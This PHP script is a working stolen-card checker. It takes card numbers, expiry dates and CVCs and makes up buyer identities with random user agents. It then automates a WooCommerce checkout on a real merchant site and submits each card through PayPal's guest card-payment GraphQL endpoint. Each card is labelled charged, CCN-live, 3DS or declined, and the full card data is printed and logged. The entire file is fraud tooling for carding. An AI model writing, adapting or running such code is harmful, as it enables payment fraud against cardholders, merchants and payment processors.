<?php
// Enable error reporting for debugging (disable in production)
ini_set('display_errors', 0);
ini_set('display_startup_errors', 0);
error_reporting(E_ALL);

// Log request for debugging
error_log("PayPal1$ request received: " . json_encode($_POST));

// Check for required POST parameters
if (!isset($_POST['card']['number']) || !isset($_POST['card']['exp_month']) || !isset($_POST['card']['exp_year']) || !isset($_POST['card']['cvc'])) {
    error_log("Missing card parameters in PayPal1$ request");
    die("DECLINED|Invalid card data|" . ($_POST['card']['number'] ?? 'Unknown') . "|{$_POST['card']['exp_month']}|{$_POST['card']['exp_year']}|{$_POST['card']['cvc']}");
}

// Card details
$card_number = preg_replace('/\D/', '', $_POST['card']['number']);
$exp_month = str_pad($_POST['card']['exp_month'], 2, '0', STR_PAD_LEFT);
$exp_year = $_POST['card']['exp_year'];
$cvc = $_POST['card']['cvc'];
$display_card = "$card_number|$exp_month|$exp_year|$cvc";

// Normalize expiry year
if (strlen($exp_year) == 4 && strpos($exp_year, '20') === 0) {
    $exp_year = substr($exp_year, 2);
}

// Generate random user-agent
$user_agents = [
    'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36'
];
$user_agent = $user_agents[array_rand($user_agents)];

// Generate random data
function generate_full_name() {
    $first_names = ["Ahmed", "Mohamed", "Fatima", "Zainab", "Sarah", "Omar", "Layla", "Youssef", "Nour", "Hannah",
                    "Yara", "Khaled", "Sara", "Lina", "Nada", "Hassan", "Amina", "Rania", "Hussein", "Maha"];
    $last_names = ["Khalil", "Abdullah", "Alwan", "Shammari", "Maliki", "Smith", "Johnson", "Williams", "Jones", "Brown",
                   "Garcia", "Martinez", "Lopez", "Gonzalez", "Rodriguez"];
    return [$first_names[array_rand($first_names)], $last_names[array_rand($last_names)]];
}

function generate_address() {
    $cities = ["New York", "Los Angeles", "Chicago", "Houston", "Phoenix"];
    $states = ["NY", "CA", "IL", "TX", "AZ"];
    $streets = ["Main St", "Park Ave", "Oak St", "Cedar St", "Maple Ave"];
    $zip_codes = ["10001", "90001", "60601", "77001", "85001"];
    $index = array_rand($cities);
    return [$cities[$index], $states[$index], rand(1, 999) . " " . $streets[array_rand($streets)], $zip_codes[$index]];
}

function generate_random_account() {
    $chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
    $name = '';
    for ($i = 0; $i < 20; $i++) {
        $name .= $chars[rand(0, strlen($chars) - 1)];
    }
    $number = '';
    for ($i = 0; $i < 4; $i++) {
        $number .= rand(0, 9);
    }
    return "$name$number@gmail.com";
}

function generate_phone() {
    $number = '';
    for ($i = 0; $i < 7; $i++) {
        $number .= rand(0, 9);
    }
    return "303$number";
}

function generate_random_code($length) {
    $chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
    $code = '';
    for ($i = 0; $i < $length; $i++) {
        $code .= $chars[rand(0, strlen($chars) - 1)];
    }
    return $code;
}

list($first_name, $last_name) = generate_full_name();
list($city, $state, $street_address, $zip_code) = generate_address();
$email = generate_random_account();
$phone = generate_phone();

// Initialize cURL session
$cookie_file = tempnam(sys_get_temp_dir(), 'paypal_cookies_');
$ch = curl_init();
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie_file);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie_file);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // Warning: Enable in production
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($ch, CURLOPT_TIMEOUT, 55);
curl_setopt($ch, CURLOPT_USERAGENT, $user_agent);

// Step 1: Add to cart
$fields = [
    'quantity' => '1',
    'add-to-cart' => '4451'
];
$boundary = '----WebKitFormBoundary' . generate_random_code(16);
$multipart_data = '';
foreach ($fields as $name => $value) {
    $multipart_data .= "--$boundary\r\n";
    $multipart_data .= "Content-Disposition: form-data; name=\"$name\"\r\n\r\n";
    $multipart_data .= "$value\r\n";
}
$multipart_data .= "--$boundary--\r\n";

$headers = [
    'authority: switchupcb.com',
    'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language: ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6',
    'cache-control: max-age=0',
    'content-type: multipart/form-data; boundary=' . $boundary,
    'origin: https://switchupcb.com',
    'referer: https://switchupcb.com/shop/i-buy/',
    'sec-ch-ua: "Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile: ?1',
    'sec-ch-ua-platform: "Android"',
    'sec-fetch-dest: document',
    'sec-fetch-mode: navigate',
    'sec-fetch-site: same-origin',
    'sec-fetch-user: ?1',
    'upgrade-insecure-requests: 1'
];

curl_setopt($ch, CURLOPT_URL, 'https://switchupcb.com/shop/i-buy/');
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $multipart_data);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$response = curl_exec($ch);
if (curl_errno($ch)) {
    error_log("cURL error in add-to-cart: " . curl_error($ch));
    curl_close($ch);
    unlink($cookie_file);
    die("DECLINED|Failed to add to cart|$display_card");
}

// Step 2: Get checkout page
$headers = [
    'authority: switchupcb.com',
    'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language: ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6',
    'referer: https://switchupcb.com/cart/',
    'sec-ch-ua: "Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile: ?1',
    'sec-ch-ua-platform: "Android"',
    'sec-fetch-dest: document',
    'sec-fetch-mode: navigate',
    'sec-fetch-site: same-origin',
    'sec-fetch-user: ?1',
    'upgrade-insecure-requests: 1'
];

curl_setopt($ch, CURLOPT_URL, 'https://switchupcb.com/checkout/');
curl_setopt($ch, CURLOPT_POST, false);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$checkout_response = curl_exec($ch);
if (curl_errno($ch)) {
    error_log("cURL error in checkout: " . curl_error($ch));
    curl_close($ch);
    unlink($cookie_file);
    die("DECLINED|Failed to load checkout|$display_card");
}

// Extract nonces
preg_match('/update_order_review_nonce":"(.*?)"/', $checkout_response, $sec_match);
preg_match('/save_checkout_form.*?nonce":"(.*?)"/', $checkout_response, $nonce_match);
preg_match('/name="woocommerce-process-checkout-nonce" value="(.*?)"/', $checkout_response, $check_match);
preg_match('/create_order.*?nonce":"(.*?)"/', $checkout_response, $create_match);

$sec = $sec_match[1] ?? '';
$nonce = $nonce_match[1] ?? '';
$check = $check_match[1] ?? '';
$create = $create_match[1] ?? '';

if (!$sec || !$check || !$create) {
    error_log("Failed to extract nonces from checkout page");
    curl_close($ch);
    unlink($cookie_file);
    die("DECLINED|Failed to extract checkout data|$display_card");
}

// Step 3: Update order review
$headers = [
    'authority: switchupcb.com',
    'accept: */*',
    'accept-language: ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6',
    'content-type: application/x-www-form-urlencoded; charset=UTF-8',
    'origin: https://switchupcb.com',
    'referer: https://switchupcb.com/checkout/',
    'sec-ch-ua: "Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile: ?1',
    'sec-ch-ua-platform: "Android"',
    'sec-fetch-dest: empty',
    'sec-fetch-mode: cors',
    'sec-fetch-site: same-origin'
];

$data = http_build_query([
    'security' => $sec,
    'payment_method' => 'stripe',
    'country' => 'US',
    'state' => 'NY',
    'postcode' => '10080',
    'city' => 'New York',
    'address' => 'New York',
    'address_2' => '',
    's_country' => 'US',
    's_state' => 'NY',
    's_postcode' => '10080',
    's_city' => 'New York',
    's_address' => 'New York',
    's_address_2' => '',
    'has_full_address' => 'true',
    'post_data' => "wc_order_attribution_source_type=typein&wc_order_attribution_referrer=(none)&wc_order_attribution_utm_campaign=(none)&wc_order_attribution_utm_source=(direct)&wc_order_attribution_utm_medium=(none)&wc_order_attribution_utm_content=(none)&wc_order_attribution_utm_id=(none)&wc_order_attribution_utm_term=(none)&wc_order_attribution_utm_source_platform=(none)&wc_order_attribution_utm_creative_format=(none)&wc_order_attribution_utm_marketing_tactic=(none)&wc_order_attribution_session_entry=https%3A%2F%2Fswitchupcb.com%2F&wc_order_attribution_session_start_time=2025-01-15%2016%3A33%3A26&wc_order_attribution_session_pages=15&wc_order_attribution_session_count=1&wc_order_attribution_user_agent=" . urlencode($user_agent) . "&billing_first_name=$first_name&billing_last_name=$last_name&billing_company=&billing_country=US&billing_address_1=New%20York&billing_address_2=&billing_city=New%20York&billing_state=NY&billing_postcode=10080&billing_phone=$phone&billing_email=$email&account_username=&account_password=&order_comments=&g-recaptcha-response=&payment_method=stripe&wc-stripe-payment-method-upe=&wc_stripe_selected_upe_payment_type=&wc-stripe-is-deferred-intent=1&terms-field=1&woocommerce-process-checkout-nonce=$check&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review"
]);

curl_setopt($ch, CURLOPT_URL, 'https://switchupcb.com/?wc-ajax=update_order_review');
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$response = curl_exec($ch);
if (curl_errno($ch)) {
    error_log("cURL error in update_order_review: " . curl_error($ch));
    curl_close($ch);
    unlink($cookie_file);
    die("DECLINED|Failed to update order|$display_card");
}

// Step 4: Create order
$headers = [
    'authority: switchupcb.com',
    'accept: */*',
    'accept-language: en-US,en;q=0.9',
    'cache-control: no-cache',
    'content-type: application/json',
    'origin: https://switchupcb.com',
    'pragma: no-cache',
    'referer: https://switchupcb.com/checkout/',
    'sec-ch-ua: "Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile: ?1',
    'sec-ch-ua-platform: "Android"',
    'sec-fetch-dest: empty',
    'sec-fetch-mode: cors',
    'sec-fetch-site: same-origin'
];

$json_data = [
    'nonce' => $create,
    'payer' => null,
    'bn_code' => 'Woo_PPCP',
    'context' => 'checkout',
    'order_id' => '0',
    'payment_method' => 'ppcp-gateway',
    'funding_source' => 'card',
    'form_encoded' => "billing_first_name=$first_name&billing_last_name=$last_name&billing_company=&billing_country=US&billing_address_1=" . urlencode($street_address) . "&billing_address_2=&billing_city=$city&billing_state=$state&billing_postcode=$zip_code&billing_phone=$phone&billing_email=$email&account_username=&account_password=&order_comments=&wc_order_attribution_source_type=typein&wc_order_attribution_referrer=%28none%29&wc_order_attribution_utm_campaign=%28none%29&wc_order_attribution_utm_source=%28direct%29&wc_order_attribution_utm_medium=%28none%29&wc_order_attribution_utm_content=%28none%29&wc_order_attribution_utm_id=%28none%29&wc_order_attribution_utm_term=%28none%29&wc_order_attribution_session_entry=https%3A%2F%2Fswitchupcb.com%2Fshop%2Fdrive-me-so-crazy%2F&wc_order_attribution_session_start_time=2024-03-15+10%3A00%3A46&wc_order_attribution_session_pages=3&wc_order_attribution_session_count=1&wc_order_attribution_user_agent=" . urlencode($user_agent) . "&g-recaptcha-response=&wc-stripe-payment-method-upe=&wc_stripe_selected_upe_payment_type=card&payment_method=ppcp-gateway&terms=on&terms-field=1&woocommerce-process-checkout-nonce=$check&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review&ppcp-funding-source=card",
    'createaccount' => false,
    'save_payment_method' => false
];

curl_setopt($ch, CURLOPT_URL, 'https://switchupcb.com/?wc-ajax=ppc-create-order');
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($json_data));
curl_setopt($ch, CURLOPT_HTTPHEADER, array_merge($headers, ['Content-Type: application/json']));
$response = curl_exec($ch);
if (curl_errno($ch)) {
    error_log("cURL error in ppc-create-order: " . curl_error($ch));
    curl_close($ch);
    unlink($cookie_file);
    die("DECLINED|Failed to create order|$display_card");
}

$response_data = json_decode($response, true);
$order_id = $response_data['data']['id'] ?? '';
$pcp = $response_data['data']['custom_id'] ?? '';
if (!$order_id) {
    error_log("Failed to extract order ID from ppc-create-order response");
    curl_close($ch);
    unlink($cookie_file);
    die("DECLINED|Failed to create order|$display_card");
}

// Step 5: Load card fields
$lol1 = generate_random_code(10);
$lol2 = generate_random_code(10);
$lol3 = generate_random_code(11);
$session_id = "uid_{$lol1}_{$lol3}";
$button_session_id = "uid_{$lol2}_{$lol3}";

$headers = [
    'authority: www.paypal.com',
    'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language: ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6',
    'referer: https://www.paypal.com/smart/buttons?style.label=paypal&style.layout=vertical&style.color=gold&style.shape=rect&style.tagline=false&style.menuPlacement=below&allowBillingPayments=true&applePaySupport=false&buttonSessionID=uid_378e07784c_mtc6nde6ndk&buttonSize=large&customerId=&clientID=AY7TjJuH5RtvCuEf2ZgEVKs3quu69UggsCg29lkrb3kvsdGcX2ljKidYXXHPParmnymd9JacfRh0hzEp&clientMetadataID=uid_b5c925a7b4_mtc6nde6ndk&commit=true&components.0=buttons&components.1=funding-eligibility&currency=USD&debug=false&disableSetCookie=true&enableFunding.0=venmo&enableFunding.1=paylater&env=production&experiment.enableVenmo=true&experiment.venmoVaultWithoutPurchase=false&experiment.venmoWebEnabled=false&flow=purchase&fundingEligibility=eyJwYXlwYWwiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6ZmFsc2V9LCJwYXlsYXRlciI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhdWx0YWJsZSI6ZmFsc2UsInByb2R1Y3RzIjp7InBheUluMyI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhcmlhbnQiOm51bGx9LCJwYXlJbjQiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXJpYW50IjpudWxsfSwicGF5bGF0ZXIiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXJpYW50IjpudWxsfX19LCJjYXJkIjp7ImVsaWdpYmxlIjp0cnVlLCJicmFuZGVkIjp0cnVlLCJpbnN0YWxsbWVudHMiOmZhbHNlLCJ2ZW5kb3JzIjp7InZpc2EiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6dHJ1ZX0sIm1hc3RlcmNhcmQiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6dHJ1ZX0sImFtZXgiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6dHJ1ZX0sImRpc2NvdmVyIjp7ImVsaWdpYmxlIjpmYWxzZSwidmF1bHRhYmxlIjp0cnVlfSwiaGlwZXIiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXVsdGFibGUiOmZhbHNlfSwiZWxvIjp7ImVsaWdpYmxlIjpmYWxzZSwidmF1bHRhYmxlIjp0cnVlfSwiamNiIjp7ImVsaWdpYmxlIjpmYWxzZSwidmF1bHRaYmxlIjp0cnVlfSwibWFlc3RybyI6eyJlbGlnaWJsZSI6dHJ1ZSwidmF1bHRhYmxlIjp0cnVlfSwiZGluZXJzIjp7ImVsaWdpYmxlIjp0cnVlLCJ2YXVsdGFibGUiOnRydWV9LCJjdXAiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXVsdGFibGUiOnRydWV9fSwiZ3Vlc3RFbmFibGVkIjpmYWxzZX0sInZlbm1vIjp7ImVsaWdpYmxlIjpmYWxzZSwidmF1bHRhYmxlIjpmYWxzZX0sIml0YXUiOnsiZWxpZ2libGUiOmZhbHNlfSwiY3JlZGl0Ijp7ImVsaWdpYmxlIjpmYWxzZX0sImFwcGxlcGF5Ijp7ImVsaWdpYmxlIjpmYWxzZX0sInNlcGEiOnsiZWxpZ2libGUiOmZhbHNlfSwiaWRlYWwiOnsiZWxpZ2libGUiOmZhbHNlfSwiYmFuY29udGFjdCI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJnaXJvcGF5Ijp7ImVsaWdpYmxlIjpmYWxzZX0sImVwcyI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJzb2ZvcnQiOnsiZWxpZ2libGUiOmZhbHNlfSwibXliYW5rIjp7ImVsaWdpYmxlIjpmYWxzZX0sInAyNCI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJ3ZWNoYXRwYXkiOnsiZWxpZ2libGUiOmZhbHNlfSwicGF5dSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJibGlrIjp7ImVsaWdpYmxlIjpmYWxzZX0sInRydXN0bHkiOnsiZWxpZ2libGUiOmZhbHNlfSwib3h4byI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJib2xldG8iOnsiZWxpZ2libGUiOmZhbHNlfSwiYm9sZXRvYmFuY2FyaW8iOnsiZWxpZ2libGUiOmZhbHNlfSwibWVyY2Fkb3BhZ28iOnsiZWxpZ2libGUiOmZhbHNlfSwibXVsdGliYW5jbyI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJzYXRpc3BheSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJwYWlkeSI6eyJlbGlnaWJsZSI6ZmFsc2V9fQ&intent=capture&locale.country=EG&locale.lang=ar&hasShippingCallback=false&pageType=checkout&platform=mobile&renderedButtons.0=paypal&renderedButtons.1=card&sessionID=uid_b5c925a7b4_mtc6nde6ndk&sdkCorrelationID=prebuild&sdkMeta=eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QVk3VGpKdUg1UnR2Q3VFZjJaZ0VWS3MzcXV1NjlVZ2dzQ2cyOWxrcmIza3ZzZEdjWDJsaktpZFlYWEhQUGFybW55bWQ5SmFjZlJoMGh6RXAmY3VycmVuY3k9VVNEJmludGVncmF0aW9uLWRhdGU9MjAyNC0xMi0zMSZjb21wb25lbnRzPWJ1dHRvbnMsZnVuZGluZy1lbGlnaWJpbGl0eSZ2YXVsdD1mYWxzZSZjb21taXQ9dHJ1ZSZpbnRlbnQ9Y2FwdHVyZSZlbmFibGUtZnVuZGluZz12ZW5tbyxwYXlsYXRlciIsImF0dHJzIjp7ImRhdGEtcGFydG5lci1hdHRyaWJ1dGlvbi1pZCI6Ildvb19QUENQIiwiZGF0YS11aWQiOiJ1aWRfcHdhZWVpc2N1dHZxa2F1b2Nvd2tnZnZudmtveG5tIn19&sdkVersion=5.0.465&storageID=uid_ba45630ca6_mtc6nde6ndk&supportedNativeBrowser=true&supportsPopups=true&vault=false',
    'sec-ch-ua: "Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile: ?1',
    'sec-ch-ua-platform: "Android"',
    'sec-fetch-dest: iframe',
    'sec-fetch-mode: navigate',
    'sec-fetch-site: same-origin',
    'sec-fetch-user: ?1',
    'upgrade-insecure-requests: 1'
];

$params = http_build_query([
    'sessionID' => $session_id,
    'buttonSessionID' => $button_session_id,
    'locale.x' => 'ar_EG',
    'commit' => 'true',
    'hasShippingCallback' => 'false',
    'env' => 'production',
    'country.x' => 'EG',
    'sdkMeta' => 'eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QVk3VGpKdUg1UnR2Q3VFZjJaZ0VWS3MzcXV1NjlVZ2dzQ2cyOWxrcmIza3ZzZEdjWDJsaktpZFlYWEhQUGFybW55bWQ5SmFjZlJoMGh6RXAmY3VycmVuY3k9VVNEJmludGVncmF0aW9uLWRhdGU9MjAyNC0xMi0zMSZjb21wb25lbnRzPWJ1dHRvbnMsZnVuZGluZy1lbGlnaWJpbGl0eSZ2YXVsdD1mYWxzZSZjb21taXQ9dHJ1ZSZpbnRlbnQ9Y2FwdHVyZSZlbmFibGUtZnVuZGluZz12ZW5tbyxwYXlsYXRlciIsImF0dHJzIjp7ImRhdGEtcGFydG5lci1hdHRyaWJ1dGlvbi1pZCI6Ildvb19QUENQIiwiZGF0YS11aWQiOiJ1aWRfcHdhZWVpc2N1dHZxa2F1b2Nvd2tnZnZudmtveG5tIn19',
    'disable-card' => '',
    'token' => $order_id
]);

curl_setopt($ch, CURLOPT_URL, 'https://www.paypal.com/smart/card-fields?' . $params);
curl_setopt($ch, CURLOPT_POST, false);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$response = curl_exec($ch);
if (curl_errno($ch)) {
    error_log("cURL error in card-fields: " . curl_error($ch));
    curl_close($ch);
    unlink($cookie_file);
    die("DECLINED|Failed to load card fields|$display_card");
}

// Step 6: Submit payment
$headers = [
    'authority: www.paypal.com',
    'accept: */*',
    'accept-language: ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6',
    'content-type: application/json',
    'origin: https://www.paypal.com',
    'referer: https://www.paypal.com/',
    'sec-ch-ua: "Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile: ?1',
    'sec-ch-ua-platform: "Android"',
    'sec-fetch-dest: empty',
    'sec-fetch-mode: cors',
    'sec-fetch-site: same-origin'
];

$card_type = 'VISA'; // Default, adjust based on card number if needed
if (substr($card_number, 0, 1) == '5') {
    $card_type = 'MASTERCARD';
} elseif (substr($card_number, 0, 2) == '37' || substr($card_number, 0, 2) == '34') {
    $card_type = 'AMEX';
}

$json_data = [
    'query' => '
        mutation payWithCard(
            $token: String!
            $card: CardInput!
            $phoneNumber: String
            $firstName: String
            $lastName: String
            $shippingAddress: AddressInput
            $billingAddress: AddressInput
            $email: String
            $currencyConversionType: CheckoutCurrencyConversionType
            $installmentTerm: Int
            $identityDocument: IdentityDocumentInput
        ) {
            approveGuestPaymentWithCreditCard(
                token: $token
                card: $card
                phoneNumber: $phoneNumber
                firstName: $firstName
                lastName: $last_name
                email: $email
                shippingAddress: $shippingAddress
                billingAddress: $billingAddress
                currencyConversionType: $currencyConversionType
                installmentTerm: $installmentTerm
                identityDocument: $identityDocument
            ) {
                flags {
                    is3DSecureRequired
                }
                cart {
                    intent
                    cartId
                    buyer {
                        userId
                        auth {
                            accessToken
                        }
                    }
                    returnUrl {
                        href
                    }
                }
                paymentContingencies {
                    threeDomainSecure {
                        status
                        method
                        redirectUrl {
                            href
                        }
                        parameter
                    }
                }
            }
        }
    ',
    'variables' => [
        'token' => $order_id,
        'card' => [
            'cardNumber' => $card_number,
            'type' => $card_type,
            'expirationDate' => "$exp_month/20$exp_year",
            'postalCode' => $zip_code,
            'securityCode' => $cvc
        ],
        'firstName' => $first_name,
        'lastName' => $last_name,
        'billingAddress' => [
            'givenName' => $first_name,
            'familyName' => $last_name,
            'line1' => 'New York',
            'line2' => null,
            'city' => 'New York',
            'state' => 'NY',
            'postalCode' => '10080',
            'country' => 'US'
        ],
        'email' => $email,
        'currencyConversionType' => 'VENDOR'
    ],
    'operationName' => null
];

curl_setopt($ch, CURLOPT_URL, 'https://www.paypal.com/graphql?fetch_credit_form_submit');
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($json_data));
curl_setopt($ch, CURLOPT_HTTPHEADER, array_merge($headers, ['Content-Type: application/json']));
$response = curl_exec($ch);
if (curl_errno($ch)) {
    error_log("cURL error in graphql payment: " . curl_error($ch));
    curl_close($ch);
    unlink($cookie_file);
    die("DECLINED|Failed to submit payment|$display_card");
}

// Clean up
curl_close($ch);
unlink($cookie_file);

// Parse response
$code = '';
$message = '';
preg_match('/"code":"(.*?)"/', $response, $code_match);
preg_match('/"message":"(.*?)"/', $response, $message_match);
if ($code_match) {
    $code = $code_match[1];
}
if ($message_match) {
    $message = $message_match[1];
}

// Determine status
if (strpos($response, 'ADD_SHIPPING_ERROR') !== false ||
    strpos($response, '"status": "succeeded"') !== false ||
    strpos($response, 'Thank You For Donation.') !== false ||
    strpos($response, 'Your payment has already been processed') !== false ||
    strpos($response, 'Success ') !== false) {
    echo "CHARGED|Success|$display_card";
} elseif (strpos($response, 'is3DSecureRequired') !== false || strpos($response, 'OTP') !== false) {
    echo "3DS|OTP! - 3D|$display_card";
} elseif (strpos($response, 'INVALID_SECURITY_CODE') !== false) {
    echo "CCN|Approved! - CCN|$display_card";
} elseif (strpos($response, 'EXISTING_ACCOUNT_RESTRICTED') !== false) {
    echo "APPROVED|Approved! - AVS|$display_card";
} elseif (strpos($response, 'INVALID_BILLING_ADDRESS') !== false) {
    echo "APPROVED|Approved! - Invalid Address|$display_card";
} else {
    echo "DECLINED|$code - $message|$display_card";
}
?>
